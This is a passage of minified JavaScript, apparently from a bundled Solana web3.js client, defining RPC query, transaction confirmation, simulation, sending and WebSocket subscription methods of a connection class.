i=t.map(t=>n.request(t.methodName,t.args));n.request(i,(t,i)=>{if(t){r(t);return}e(i)})})),this._rpcWebSocket=new ol(this._rpcWsEndpoint,{autoconnect:!1,max_reconnects:1/0}),this._rpcWebSocket.on("open",this._wsOnOpen.bind(this)),this._rpcWebSocket.on("error",this._wsOnError.bind(this)),this._rpcWebSocket.on("close",this._wsOnClose.bind(this)),this._rpcWebSocket.on("accountNotification",this._wsOnAccountNotification.bind(this)),this._rpcWebSocket.on("programNotification",this._wsOnProgramAccountNotification.bind(this)),this._rpcWebSocket.on("slotNotification",this._wsOnSlotNotification.bind(this)),this._rpcWebSocket.on("slotsUpdatesNotification",this._wsOnSlotUpdatesNotification.bind(this)),this._rpcWebSocket.on("signatureNotification",this._wsOnSignatureNotification.bind(this)),this._rpcWebSocket.on("rootNotification",this._wsOnRootNotification.bind(this)),this._rpcWebSocket.on("logsNotification",this._wsOnLogsNotification.bind(this))}get commitment(){return this._commitment}get rpcEndpoint(){return this._rpcEndpoint}async getBalanceAndContext(t,e){let{commitment:r,config:i}=om(e),n=this._buildArgs([t.toBase58()],r,void 0,i),o=rk(await this._rpcRequest("getBalance",n),ox(rL()));if("error"in o)throw new n2(o.error,`failed to get balance for ${t.toBase58()}`);return o.result}async getBalance(t,e){return await this.getBalanceAndContext(t,e).then(t=>t.value).catch(e=>{throw Error("failed to get balance of account "+t.toBase58()+": "+e)})}async getBlockTime(t){let e=rk(await this._rpcRequest("getBlockTime",[t]),ov(rM(rL())));if("error"in e)throw new n2(e.error,`failed to get block time for slot ${t}`);return e.result}async getMinimumLedgerSlot(){let t=rk(await this._rpcRequest("minimumLedgerSlot",[]),ov(rL()));if("error"in t)throw new n2(t.error,"failed to get minimum ledger slot");return t.result}async getFirstAvailableBlock(){let t=rk(await this._rpcRequest("getFirstAvailableBlock",[]),oK);if("error"in t)throw new n2(t.error,"failed to get first available block");return t.result}async getSupply(t){let e={};e="string"==typeof t?{commitment:t}:t?{...t,commitment:t&&t.commitment||this.commitment}:{commitment:this.commitment};let r=rk(await this._rpcRequest("getSupply",[e]),oV);if("error"in r)throw new n2(r.error,"failed to get supply");return r.result}async getTokenSupply(t,e){let r=this._buildArgs([t.toBase58()],e),i=rk(await this._rpcRequest("getTokenSupply",r),ox(o$));if("error"in i)throw new n2(i.error,"failed to get token supply");return i.result}async getTokenAccountBalance(t,e){let r=this._buildArgs([t.toBase58()],e),i=rk(await this._rpcRequest("getTokenAccountBalance",r),ox(o$));if("error"in i)throw new n2(i.error,"failed to get token account balance");return i.result}async getTokenAccountsByOwner(t,e,r){let{commitment:i,config:n}=om(r),o=[t.toBase58()];"mint"in e?o.push({mint:e.mint.toBase58()}):o.push({programId:e.programId.toBase58()});let s=this._buildArgs(o,i,"base64",n),a=rk(await this._rpcRequest("getTokenAccountsByOwner",s),oG);if("error"in a)throw new n2(a.error,`failed to get token accounts owned by account ${t.toBase58()}`);return a.result}async getParsedTokenAccountsByOwner(t,e,r){let i=[t.toBase58()];"mint"in e?i.push({mint:e.mint.toBase58()}):i.push({programId:e.programId.toBase58()});let n=this._buildArgs(i,r,"jsonParsed"),o=rk(await this._rpcRequest("getTokenAccountsByOwner",n),oY);if("error"in o)throw new n2(o.error,`failed to get token accounts owned by account ${t.toBase58()}`);return o.result}async getLargestAccounts(t){let e={...t,commitment:t&&t.commitment||this.commitment},r=e.filter||e.commitment?[e]:[],i=rk(await this._rpcRequest("getLargestAccounts",r),oX);if("error"in i)throw new n2(i.error,"failed to get largest accounts");return i.result}async getTokenLargestAccounts(t,e){let r=this._buildArgs([t.toBase58()],e),i=rk(await this._rpcRequest("getTokenLargestAccounts",r),oZ);if("error"in i)throw new n2(i.error,"failed to get token largest accounts");return i.result}async getAccountInfoAndContext(t,e){let{commitment:r,config:i}=om(e),n=this._buildArgs([t.toBase58()],r,"base64",i),o=rk(await this._rpcRequest("getAccountInfo",n),ox(rM(oQ)));if("error"in o)throw new n2(o.error,`failed to get info about account ${t.toBase58()}`);return o.result}async getParsedAccountInfo(t,e){let{commitment:r,config:i}=om(e),n=this._buildArgs([t.toBase58()],r,"jsonParsed",i),o=rk(await this._rpcRequest("getAccountInfo",n),ox(rM(o2)));if("error"in o)throw new n2(o.error,`failed to get info about account ${t.toBase58()}`);return o.result}async getAccountInfo(t,e){try{return(await this.getAccountInfoAndContext(t,e)).value}catch(e){throw Error("failed to get info about account "+t.toBase58()+": "+e)}}async getMultipleParsedAccounts(t,e){let{commitment:r,config:i}=om(e),n=t.map(t=>t.toBase58()),o=this._buildArgs([n],r,"jsonParsed",i),s=rk(await this._rpcRequest("getMultipleAccounts",o),ox(rE(rM(o2))));if("error"in s)throw new n2(s.error,`failed to get info for accounts ${n}`);return s.result}async getMultipleAccountsInfoAndContext(t,e){let{commitment:r,config:i}=om(e),n=t.map(t=>t.toBase58()),o=this._buildArgs([n],r,"base64",i),s=rk(await this._rpcRequest("getMultipleAccounts",o),ox(rE(rM(oQ))));if("error"in s)throw new n2(s.error,`failed to get info for accounts ${n}`);return s.result}async getMultipleAccountsInfo(t,e){return(await this.getMultipleAccountsInfoAndContext(t,e)).value}async getStakeActivation(t,e,r){let{commitment:i,config:n}=om(e),o=this._buildArgs([t.toBase58()],i,void 0,{...n,epoch:null!=r?r:n?.epoch}),s=rk(await this._rpcRequest("getStakeActivation",o),ov(o8));if("error"in s)throw new n2(s.error,`failed to get Stake Activation ${t.toBase58()}`);return s.result}async getProgramAccounts(t,e){let{commitment:r,config:i}=om(e),{encoding:n,...o}=i||{},s=this._buildArgs([t.toBase58()],r,n||"base64",{...o,...o.filters?{filters:oy(o.filters)}:null}),a=await this._rpcRequest("getProgramAccounts",s),u=rE(o0),l=!0===o.withContext?rk(a,ox(u)):rk(a,ov(u));if("error"in l)throw new n2(l.error,`failed to get accounts owned by program ${t.toBase58()}`);return l.result}async getParsedProgramAccounts(t,e){let{commitment:r,config:i}=om(e),n=this._buildArgs([t.toBase58()],r,"jsonParsed",i),o=rk(await this._rpcRequest("getProgramAccounts",n),ov(rE(o3)));if("error"in o)throw new n2(o.error,`failed to get accounts owned by program ${t.toBase58()}`);return o.result}async confirmTransaction(t,r){let i,n;if("string"==typeof t)i=t;else{if(t.abortSignal?.aborted)return Promise.reject(t.abortSignal.reason);i=t.signature}try{n=e(t4).decode(i)}catch(t){throw Error("signature must be base58 encoded: "+i)}return(nq(64===n.length,"signature has invalid length"),"string"==typeof t)?await this.confirmTransactionUsingLegacyTimeoutStrategy({commitment:r||this.commitment,signature:i}):"lastValidBlockHeight"in t?await this.confirmTransactionUsingBlockHeightExceedanceStrategy({commitment:r||this.commitment,strategy:t}):await this.confirmTransactionUsingDurableNonceStrategy({commitment:r||this.commitment,strategy:t})}getCancellationPromise(t){return new Promise((e,r)=>{null!=t&&(t.aborted?r(t.reason):t.addEventListener("abort",()=>{r(t.reason)}))})}getTransactionConfirmationPromise({commitment:t,signature:e}){let r,i;let n=!1;return{abortConfirmation:()=>{i&&(i(),i=void 0),null!=r&&(this.removeSignatureListener(r),r=void 0)},confirmationPromise:new Promise((o,s)=>{try{r=this.onSignature(e,(t,e)=>{r=void 0,o({__type:n$.PROCESSED,response:{context:e,value:t}})},t);let a=new Promise(t=>{null==r?t():i=this._onSubscriptionStateChange(r,e=>{"subscribed"===e&&t()})});(async()=>{if(await a,n)return;let r=await this.getSignatureStatus(e);if(n||null==r)return;let{context:i,value:u}=r;if(null!=u){if(u?.err)s(u.err);else{switch(t){case"confirmed":case"single":case"singleGossip":if("processed"===u.confirmationStatus)return;break;case"finalized":case"max":case"root":if("processed"===u.confirmationStatus||"confirmed"===u.confirmationStatus)return}n=!0,o({__type:n$.PROCESSED,response:{context:i,value:u}})}}})()}catch(t){s(t)}})}}async confirmTransactionUsingBlockHeightExceedanceStrategy({commitment:t,strategy:{abortSignal:e,lastValidBlockHeight:r,signature:i}}){let n,o=!1,s=new Promise(e=>{let i=async()=>{try{return await this.getBlockHeight(t)}catch(t){return -1}};(async()=>{let t=await i();if(!o){for(;t<=r;)if(await n8(1e3),o||(t=await i(),o))return;e({__type:n$.BLOCKHEIGHT_EXCEEDED})}})()}),{abortConfirmation:a,confirmationPromise:u}=this.getTransactionConfirmationPromise({commitment:t,signature:i}),l=this.getCancellationPromise(e);try{let t=await Promise.race([l,u,s]);if(t.__type===n$.PROCESSED)n=t.response;else throw new nO(i)}finally{o=!0,a()}return n}async confirmTransactionUsingDurableNonceStrategy({commitment:t,strategy:{abortSignal:e,minContextSlot:r,nonceAccountPubkey:i,nonceValue:n,signature:o}}){let s,a=!1,u=new Promise(e=>{let o=n,s=null,u=async()=>{try{let{context:e,value:n}=await this.getNonceAndContext(i,{commitment:t,minContextSlot:r});return s=e.slot,n?.nonce}catch(t){return o}};(async()=>{if(o=await u(),!a)for(;;){if(n!==o){e({__type:n$.NONCE_INVALID,slotInWhichNonceDidAdvance:s});return}if(await n8(2e3),a||(o=await u(),a))return}})()}),{abortConfirmation:l,confirmationPromise:c}=this.getTransactionConfirmationPromise({commitment:t,signature:o}),h=this.getCancellationPromise(e);try{let e=await Promise.race([h,c,u]);if(e.__type===n$.PROCESSED)s=e.response;else{let i;for(;;){let t=await this.getSignatureStatus(o);if(null==t)break;if(t.context.slot<(e.slotInWhichNonceDidAdvance??r)){await n8(400);continue}i=t;break}if(i?.value){let e=t||"finalized",{confirmationStatus:r}=i.value;switch(e){case"processed":case"recent":if("processed"!==r&&"confirmed"!==r&&"finalized"!==r)throw new nR(o);break;case"confirmed":case"single":case"singleGossip":if("confirmed"!==r&&"finalized"!==r)throw new nR(o);break;case"finalized":case"max":case"root":if("finalized"!==r)throw new nR(o)}s={context:i.context,value:{err:i.value.err}}}else throw new nR(o)}}finally{a=!0,l()}return s}async confirmTransactionUsingLegacyTimeoutStrategy({commitment:t,signature:e}){let r,i;let n=new Promise(e=>{let i=this._confirmTransactionInitialTimeout||6e4;switch(t){case"processed":case"recent":case"single":case"confirmed":case"singleGossip":i=this._confirmTransactionInitialTimeout||3e4}r=setTimeout(()=>e({__type:n$.TIMED_OUT,timeoutMs:i}),i)}),{abortConfirmation:o,confirmationPromise:s}=this.getTransactionConfirmationPromise({commitment:t,signature:e});try{let t=await Promise.race([s,n]);if(t.__type===n$.PROCESSED)i=t.response;else throw new nP(e,t.timeoutMs/1e3)}finally{clearTimeout(r),o()}return i}async getClusterNodes(){let t=rk(await this._rpcRequest("getClusterNodes",[]),ov(rE(ss)));if("error"in t)throw new n2(t.error,"failed to get cluster nodes");return t.result}async getVoteAccounts(t){let e=this._buildArgs([],t),r=rk(await this._rpcRequest("getVoteAccounts",e),su);if("error"in r)throw new n2(r.error,"failed to get vote accounts");return r.result}async getSlot(t){let{commitment:e,config:r}=om(t),i=this._buildArgs([],e,void 0,r),n=rk(await this._rpcRequest("getSlot",i),ov(rL()));if("error"in n)throw new n2(n.error,"failed to get slot");return n.result}async getSlotLeader(t){let{commitment:e,config:r}=om(t),i=this._buildArgs([],e,void 0,r),n=rk(await this._rpcRequest("getSlotLeader",i),ov(rP()));if("error"in n)throw new n2(n.error,"failed to get slot leader");return n.result}async getSlotLeaders(t,e){let r=rk(await this._rpcRequest("getSlotLeaders",[t,e]),ov(rE(od)));if("error"in r)throw new n2(r.error,"failed to get slot leaders");return r.result}async getSignatureStatus(t,e){let{context:r,value:i}=await this.getSignatureStatuses([t],e);return nq(1===i.length),{context:r,value:i[0]}}async getSignatureStatuses(t,e){let r=[t];e&&r.push(e);let i=rk(await this._rpcRequest("getSignatureStatuses",r),sh);if("error"in i)throw new n2(i.error,"failed to get signature status");return i.result}async getTransactionCount(t){let{commitment:e,config:r}=om(t),i=this._buildArgs([],e,void 0,r),n=rk(await this._rpcRequest("getTransactionCount",i),ov(rL()));if("error"in n)throw new n2(n.error,"failed to get transaction count");return n.result}async getTotalSupply(t){return(await this.getSupply({commitment:t,excludeNonCirculatingAccountsList:!0})).value.total}async getInflationGovernor(t){let e=this._buildArgs([],t),r=rk(await this._rpcRequest("getInflationGovernor",e),oH);if("error"in r)throw new n2(r.error,"failed to get inflation");return r.result}async getInflationReward(t,e,r){let{commitment:i,config:n}=om(r),o=this._buildArgs([t.map(t=>t.toBase58())],i,void 0,{...n,epoch:null!=e?e:n?.epoch}),s=rk(await this._rpcRequest("getInflationReward",o),oE);if("error"in s)throw new n2(s.error,"failed to get inflation reward");return s.result}async getInflationRate(){let t=rk(await this._rpcRequest("getInflationRate",[]),oq);if("error"in t)throw new n2(t.error,"failed to get inflation rate");return t.result}async getEpochInfo(t){let{commitment:e,config:r}=om(t),i=this._buildArgs([],e,void 0,r),n=rk(await this._rpcRequest("getEpochInfo",i),oF);if("error"in n)throw new n2(n.error,"failed to get epoch info");return n.result}async getEpochSchedule(){let t=rk(await this._rpcRequest("getEpochSchedule",[]),oD);if("error"in t)throw new n2(t.error,"failed to get epoch schedule");let e=t.result;return new oa(e.slotsPerEpoch,e.leaderScheduleSlotOffset,e.warmup,e.firstNormalEpoch,e.firstNormalSlot)}async getLeaderSchedule(){let t=rk(await this._rpcRequest("getLeaderSchedule",[]),oj);if("error"in t)throw new n2(t.error,"failed to get leader schedule");return t.result}async getMinimumBalanceForRentExemption(t,e){let r=this._buildArgs([t],e),i=rk(await this._rpcRequest("getMinimumBalanceForRentExemption",r),sf);return"error"in i?(console.warn("Unable to fetch minimum balance for rent exemption"),0):i.result}async getRecentBlockhashAndContext(t){let{context:e,value:{blockhash:r}}=await this.getLatestBlockhashAndContext(t);return{context:e,value:{blockhash:r,feeCalculator:{get lamportsPerSignature(){throw Error("The capability to fetch `lamportsPerSignature` using the `getRecentBlockhash` API is no longer offered by the network. Use the `getFeeForMessage` API to obtain the fee for a given message.")},toJSON:()=>({})}}}}async getRecentPerformanceSamples(t){let e=rk(await this._rpcRequest("getRecentPerformanceSamples",t?[t]:[]),sH);if("error"in e)throw new n2(e.error,"failed to get recent performance samples");return e.result}async getFeeCalculatorForBlockhash(t,e){let r=this._buildArgs([t],e),i=rk(await this._rpcRequest("getFeeCalculatorForBlockhash",r),sq);if("error"in i)throw new n2(i.error,"failed to get fee calculator");let{context:n,value:o}=i.result;return{context:n,value:null!==o?o.feeCalculator:null}}async getFeeForMessage(t,e){let r=n_(t.serialize()).toString("base64"),i=this._buildArgs([r],e),n=rk(await this._rpcRequest("getFeeForMessage",i),ox(rM(rL())));if("error"in n)throw new n2(n.error,"failed to get fee for message");if(null===n.result)throw Error("invalid blockhash");return n.result}async getRecentPrioritizationFees(t){let e=t?.lockedWritableAccounts?.map(t=>t.toBase58()),r=e?.length?[e]:[],i=rk(await this._rpcRequest("getRecentPrioritizationFees",r),oW);if("error"in i)throw new n2(i.error,"failed to get recent prioritization fees");return i.result}async getRecentBlockhash(t){try{return(await this.getRecentBlockhashAndContext(t)).value}catch(t){throw Error("failed to get recent blockhash: "+t)}}async getLatestBlockhash(t){try{return(await this.getLatestBlockhashAndContext(t)).value}catch(t){throw Error("failed to get recent blockhash: "+t)}}async getLatestBlockhashAndContext(t){let{commitment:e,config:r}=om(t),i=this._buildArgs([],e,void 0,r),n=rk(await this._rpcRequest("getLatestBlockhash",i),sN);if("error"in n)throw new n2(n.error,"failed to get latest blockhash");return n.result}async isBlockhashValid(t,e){let{commitment:r,config:i}=om(e),n=this._buildArgs([t],r,void 0,i),o=rk(await this._rpcRequest("isBlockhashValid",n),sz);if("error"in o)throw new n2(o.error,"failed to determine if the blockhash `"+t+"`is valid");return o.result}async getVersion(){let t=rk(await this._rpcRequest("getVersion",[]),ov(oR));if("error"in t)throw new n2(t.error,"failed to get version");return t.result}async getGenesisHash(){let t=rk(await this._rpcRequest("getGenesisHash",[]),ov(rP()));if("error"in t)throw new n2(t.error,"failed to get genesis hash");return t.result}async getBlock(t,e){let{commitment:r,config:i}=om(e),n=this._buildArgsAtLeastConfirmed([t],r,void 0,i),o=await this._rpcRequest("getBlock",n);try{switch(i?.transactionDetails){case"accounts":{let t=rk(o,sM);if("error"in t)throw t.error;return t.result}case"none":{let t=rk(o,sI);if("error"in t)throw t.error;return t.result}default:{let t=rk(o,s_);if("error"in t)throw t.error;let{result:e}=t;return e?{...e,transactions:e.transactions.map(({transaction:t,meta:e,version:r})=>({meta:e,transaction:{...t,message:oS(r,t.message)},version:r}))}:null}}}catch(t){throw new n2(t,"failed to get confirmed block")}}async getParsedBlock(t,e){let{commitment:r,config:i}=om(e),n=this._buildArgsAtLeastConfirmed([t],r,"jsonParsed",i),o=await this._rpcRequest("getBlock",n);try{switch(i?.transactionDetails){case"accounts":{let t=rk(o,sT);if("error"in t)throw t.error;return t.result}case"none":{let t=rk(o,sO);if("error"in t)throw t.error;return t.result}default:{let t=rk(o,sL);if("error"in t)throw t.error;return t.result}}}catch(t){throw new n2(t,"failed to get block")}}async getBlockProduction(t){let e,r;if("string"==typeof t)r=t;else if(t){let{commitment:i,...n}=t;r=i,e=n}let i=this._buildArgs([],r,"base64",e),n=rk(await this._rpcRequest("getBlockProduction",i),oz);if("error"in n)throw new n2(n.error,"failed to get block production information");return n.result}async getTransaction(t,e){let{commitment:r,config:i}=om(e),n=this._buildArgsAtLeastConfirmed([t],r,void 0,i),o=rk(await this._rpcRequest("getTransaction",n),sC);if("error"in o)throw new n2(o.error,"failed to get transaction");let s=o.result;return s?{...s,transaction:{...s.transaction,message:oS(s.version,s.transaction.message)}}:s}async getParsedTransaction(t,e){let{commitment:r,config:i}=om(e),n=this._buildArgsAtLeastConfirmed([t],r,"jsonParsed",i),o=rk(await this._rpcRequest("getTransaction",n),sU);if("error"in o)throw new n2(o.error,"failed to get transaction");return o.result}async getParsedTransactions(t,e){let{commitment:r,config:i}=om(e),n=t.map(t=>({methodName:"getTransaction",args:this._buildArgsAtLeastConfirmed([t],r,"jsonParsed",i)}));return(await this._rpcBatchRequest(n)).map(t=>{let e=rk(t,sU);if("error"in e)throw new n2(e.error,"failed to get transactions");return e.result})}async getTransactions(t,e){let{commitment:r,config:i}=om(e),n=t.map(t=>({methodName:"getTransaction",args:this._buildArgsAtLeastConfirmed([t],r,void 0,i)}));return(await this._rpcBatchRequest(n)).map(t=>{let e=rk(t,sC);if("error"in e)throw new n2(e.error,"failed to get transactions");let r=e.result;return r?{...r,transaction:{...r.transaction,message:oS(r.version,r.transaction.message)}}:r})}async getConfirmedBlock(t,e){let r=this._buildArgsAtLeastConfirmed([t],e),i=rk(await this._rpcRequest("getBlock",r),sP);if("error"in i)throw new n2(i.error,"failed to get confirmed block");let n=i.result;if(!n)throw Error("Confirmed block "+t+" not found");let o={...n,transactions:n.transactions.map(({transaction:t,meta:e})=>{let r=new nK(t.message);return{meta:e,transaction:{...t,message:r}}})};return{...o,transactions:o.transactions.map(({transaction:t,meta:e})=>({meta:e,transaction:nJ.populate(t.message,t.signatures)}))}}async getBlocks(t,e,r){let i=this._buildArgsAtLeastConfirmed(void 0!==e?[t,e]:[t],r),n=rk(await this._rpcRequest("getBlocks",i),ov(rE(rL())));if("error"in n)throw new n2(n.error,"failed to get blocks");return n.result}async getBlockSignatures(t,e){let r=this._buildArgsAtLeastConfirmed([t],e,void 0,{transactionDetails:"signatures",rewards:!1}),i=rk(await this._rpcRequest("getBlock",r),sR);if("error"in i)throw new n2(i.error,"failed to get block");let n=i.result;if(!n)throw Error("Block "+t+" not found");return n}async getConfirmedBlockSignatures(t,e){let r=this._buildArgsAtLeastConfirmed([t],e,void 0,{transactionDetails:"signatures",rewards:!1}),i=rk(await this._rpcRequest("getBlock",r),sR);if("error"in i)throw new n2(i.error,"failed to get confirmed block");let n=i.result;if(!n)throw Error("Confirmed block "+t+" not found");return n}async getConfirmedTransaction(t,e){let r=this._buildArgsAtLeastConfirmed([t],e),i=rk(await this._rpcRequest("getTransaction",r),sC);if("error"in i)throw new n2(i.error,"failed to get transaction");let n=i.result;if(!n)return n;let o=new nK(n.transaction.message),s=n.transaction.signatures;return{...n,transaction:nJ.populate(o,s)}}async getParsedConfirmedTransaction(t,e){let r=this._buildArgsAtLeastConfirmed([t],e,"jsonParsed"),i=rk(await this._rpcRequest("getTransaction",r),sU);if("error"in i)throw new n2(i.error,"failed to get confirmed transaction");return i.result}async getParsedConfirmedTransactions(t,e){let r=t.map(t=>({methodName:"getTransaction",args:this._buildArgsAtLeastConfirmed([t],e,"jsonParsed")}));return(await this._rpcBatchRequest(r)).map(t=>{let e=rk(t,sU);if("error"in e)throw new n2(e.error,"failed to get confirmed transactions");return e.result})}async getConfirmedSignaturesForAddress(t,e,r){let i={},n=await this.getFirstAvailableBlock();for(;!("until"in i)&&!(--e<=0)&&!(e<n);)try{let t=await this.getConfirmedBlockSignatures(e,"finalized");t.signatures.length>0&&(i.until=t.signatures[t.signatures.length-1].toString())}catch(t){if(t instanceof Error&&t.message.includes("skipped"))continue;throw t}let o=await this.getSlot("finalized");for(;!("before"in i)&&!(++r>o);)try{let t=await this.getConfirmedBlockSignatures(r);t.signatures.length>0&&(i.before=t.signatures[t.signatures.length-1].toString())}catch(t){if(t instanceof Error&&t.message.includes("skipped"))continue;throw t}return(await this.getConfirmedSignaturesForAddress2(t,i)).map(t=>t.signature)}async getConfirmedSignaturesForAddress2(t,e,r){let i=this._buildArgsAtLeastConfirmed([t.toBase58()],r,void 0,e),n=rk(await this._rpcRequest("getConfirmedSignaturesForAddress2",i),o6);if("error"in n)throw new n2(n.error,"failed to get confirmed signatures for address");return n.result}async getSignaturesForAddress(t,e,r){let i=this._buildArgsAtLeastConfirmed([t.toBase58()],r,void 0,e),n=rk(await this._rpcRequest("getSignaturesForAddress",i),o5);if("error"in n)throw new n2(n.error,"failed to get signatures for address");return n.result}async getAddressLookupTable(t,e){let{context:r,value:i}=await this.getAccountInfoAndContext(t,e),n=null;return null!==i&&(n=new oc({key:t,state:oc.deserialize(i.data)})),{context:r,value:n}}async getNonceAndContext(t,e){let{context:r,value:i}=await this.getAccountInfoAndContext(t,e),n=null;return null!==i&&(n=n7.fromAccountData(i.data)),{context:r,value:n}}async getNonce(t,e){return await this.getNonceAndContext(t,e).then(t=>t.value).catch(e=>{throw Error("failed to get nonce for account "+t.toBase58()+": "+e)})}async requestAirdrop(t,e){let r=rk(await this._rpcRequest("requestAirdrop",[t.toBase58(),e]),sW);if("error"in r)throw new n2(r.error,`airdrop to ${t.toBase58()} failed`);return r.result}async _blockhashWithExpiryBlockHeight(t){if(!t){for(;this._pollingBlockhash;)await n8(100);let t=Date.now()-this._blockhashInfo.lastFetch;if(null!==this._blockhashInfo.latestBlockhash&&!(t>=3e4))return this._blockhashInfo.latestBlockhash}return await this._pollNewBlockhash()}async _pollNewBlockhash(){this._pollingBlockhash=!0;try{let t=Date.now(),e=this._blockhashInfo.latestBlockhash,r=e?e.blockhash:null;for(let t=0;t<50;t++){let t=await this.getLatestBlockhash("finalized");if(r!==t.blockhash)return this._blockhashInfo={latestBlockhash:t,lastFetch:Date.now(),transactionSignatures:[],simulatedSignatures:[]},t;await n8(200)}throw Error(`Unable to obtain a new blockhash after ${Date.now()-t}ms`)}finally{this._pollingBlockhash=!1}}async getStakeMinimumDelegation(t){let{commitment:e,config:r}=om(t),i=this._buildArgs([],e,"base64",r),n=rk(await this._rpcRequest("getStakeMinimumDelegation",i),ox(rL()));if("error"in n)throw new n2(n.error,"failed to get stake minimum delegation");return n.result}async simulateTransaction(t,e,r){let i;if("message"in t){let i=t.serialize(),n=(0,f.Buffer).from(i).toString("base64");if(Array.isArray(e)||void 0!==r)throw Error("Invalid arguments");let o=e||{};o.encoding="base64","commitment"in o||(o.commitment=this.commitment),e&&"object"==typeof e&&"innerInstructions"in e&&(o.innerInstructions=e.innerInstructions);let s=[n,o],a=rk(await this._rpcRequest("simulateTransaction",s),oN);if("error"in a)throw Error("failed to simulate transaction: "+a.error.message);return a.result}if(t instanceof nJ?((i=new nJ).feePayer=t.feePayer,i.instructions=t.instructions,i.nonceInfo=t.nonceInfo,i.signatures=t.signatures):(i=nJ.populate(t))._message=i._json=void 0,void 0!==e&&!Array.isArray(e))throw Error("Invalid arguments");if(i.nonceInfo&&e)i.sign(...e);else{let t=this._disableBlockhashCaching;for(;;){let r=await this._blockhashWithExpiryBlockHeight(t);if(i.lastValidBlockHeight=r.lastValidBlockHeight,i.recentBlockhash=r.blockhash,!e)break;if(i.sign(...e),!i.signature)throw Error("!signature");let n=i.signature.toString("base64");if(this._blockhashInfo.simulatedSignatures.includes(n)||this._blockhashInfo.transactionSignatures.includes(n))t=!0;else{this._blockhashInfo.simulatedSignatures.push(n);break}}}let n=i._compile(),o=n.serialize(),s=i._serialize(o).toString("base64"),a={encoding:"base64",commitment:this.commitment};if(r){let t=(Array.isArray(r)?r:n.nonProgramIds()).map(t=>t.toBase58());a.accounts={encoding:"base64",addresses:t}}e&&(a.sigVerify=!0),e&&"object"==typeof e&&"innerInstructions"in e&&(a.innerInstructions=e.innerInstructions);let u=[s,a],l=rk(await this._rpcRequest("simulateTransaction",u),oN);if("error"in l){let t;if("data"in l.error&&(t=l.error.data.logs)&&Array.isArray(t)){let e="\n    ",r=e+t.join(e);console.error(l.error.message,r)}throw new n1({action:"simulate",signature:"",transactionMessage:l.error.message,logs:t})}return l.result}async sendTransaction(t,e,r){if("version"in t){if(e&&Array.isArray(e))throw Error("Invalid arguments");let r=t.serialize();return await this.sendRawTransaction(r,e)}if(void 0===e||!Array.isArray(e))throw Error("Invalid arguments");if(t.nonceInfo)t.sign(...e);else{let r=this._disableBlockhashCaching;for(;;){let i=await this._blockhashWithExpiryBlockHeight(r);if(t.lastValidBlockHeight=i.lastValidBlockHeight,t.recentBlockhash=i.blockhash,t.sign(...e),!t.signature)throw Error("!signature");let n=t.signature.toString("base64");if(this._blockhashInfo.transactionSignatures.includes(n))r=!0;else{this._blockhashInfo.transactionSignatures.push(n);break}}}let i=t.serialize();return await this.sendRawTransaction(i,r)}async sendRawTransaction(t,e){let r=n_(t).toString("base64");return await this.sendEncodedTransaction(r,e)}async sendEncodedTransaction(t,e){let r={encoding:"base64"},i=e&&e.skipPreflight,n=!0===i?"processed":e&&e.preflightCommitment||this.commitment;e&&null!=e.maxRetries&&(r.maxRetries=e.maxRetries),e&&null!=e.minContextSlot&&(r.minContextSlot=e.minContextSlot),i&&(r.skipPreflight=i),n&&(r.preflightCommitment=n);let o=[t,r],s=rk(await this._rpcRequest("sendTransaction",o),sF);if("error"in s){let t;throw"data"in s.error&&(t=s.error.data.logs),new n1({action:i?"send":"simulate",signature:"",transactionMessage:s.error.message,logs:t})}return s.result}_wsOnOpen(){this._rpcWebSocketConnected=!0,this._rpcWebSocketHeartbeat=setInterval(()=>{(async()=>{try{await this._rpcWebSocket.notify("ping")}catch{}})()},5e3),this._updateSubscriptions()}_wsOnError(t){this._rpcWebSocketConnected=!1,console.error("ws error:",t.message)}_wsOnClose(t){if(this._rpcWebSocketConnected=!1,this._rpcWebSocketGeneration=(this._rpcWebSocketGeneration+1)%Number.MAX_SAFE_INTEGER,this._rpcWebSocketIdleTimeout&&(clearTimeout(this._rpcWebSocketIdleTimeout),this._rpcWebSocketIdleTimeout=null),this._rpcWebSocketHeartbeat&&(clearInterval(this._rpcWebSocketHeartbeat),this._rpcWebSocketHeartbeat=null),1e3===t){this._updateSubscriptions();return}this._subscriptionCallbacksByServerSubscriptionId={},Object.entries(this._subscriptionsByHash).forEach(([t,e])=>{this._setSubscription(t,{...e,state:"pending"})})}_setSubscription(t,e){let r=this._subscriptionsByHash[t]?.state;if(this._subscriptionsByHash[t]=e,r!==e.state){let r=this._subscriptionStateChangeCallbacksByHash[t];r&&r.forEach(t=>{try{t(e.state)}catch{}})}}_onSubscriptionStateChange(t,e){let r=this._subscriptionHashByClientSubscriptionId[t];if(null==r)return()=>{};let i=this._subscriptionStateChangeCallbacksByHash[r]||=new Set;return i.add(e),()=>{i.delete(e),0===i.size&&delete this._subscriptionStateChangeCallbacksByHash[r]}}async _updateSubscriptions(){if(0===Object.keys(this._subscriptionsByHash).length){this._rpcWebSocketConnected&&(this._rpcWebSocketConnected=!1,this._rpcWebSocketIdleTimeout=setTimeout(()=>{this._rpcWebSocketIdleTimeout=null;try{this._rpcWebSocket.close()}catch(t){t instanceof Error&&console.log(`Error when closing socket connection: ${t.message}`)}},500));return}if(null!==this._rpcWebSocketIdleTimeout&&(clearTimeout(this._rpcWebSocketIdleTimeout),this._rpcWebSocketIdleTimeout=null,this._rpcWebSocketConnected=!0),!this._rpcWebSocketConnected){this._rpcWebSocket.connect();return}let t=this._rpcWebSocketGeneration,e=()=>t===this._rpcWebSocketGeneration;await Promise.all(Object.keys(this._subscriptionsByHash).map(async t=>{let r=this._subscriptionsByHash[t];if(void 0!==r)switch(r.state){case"pending":case"unsubscribed":if(0===r.callbacks.size){delete this._subscriptionsByHash[t],"unsubscribed"===r.state&&delete this._subscriptionCallbacksByServerSubscriptionId[r.serverSubscriptionId],await this._updateSubscriptions();return}await (async()=>{let{args:i,method:n}=r;try{this._setSubscription(t,{...r,state:"subscribing"});let e=await this._rpcWebSocket.call(n,i);this._setSubscription(t,{...r,serverSubscriptionId:e,state:"subscribed"}),this._subscriptionCallbacksByServerSubscriptionId[e]=r.callbacks,await this._updateSubscriptions()}catch(o){if(console.error(`Received ${o instanceof Error?"":"JSON-RPC "}error calling \`${n}\``,{args:i,error:o}),!e())return;this._setSubscription(t,{...r,state:"pending"}),await this._updateSubscriptions()}})();break;case"subscribed":0===r.callbacks.size&&await (async()=>{let{serverSubscriptionId:i,unsubscribeMethod:n}=r;if(this._subscriptionsAutoDisposedByRpc.has(i))this._subscriptionsAutoDisposedByRpc.delete(i);else{this._setSubscription(t,{...r,state:"unsubscribing"}),this._setSubscription(t,{...r,state:"unsubscribing"});try{await 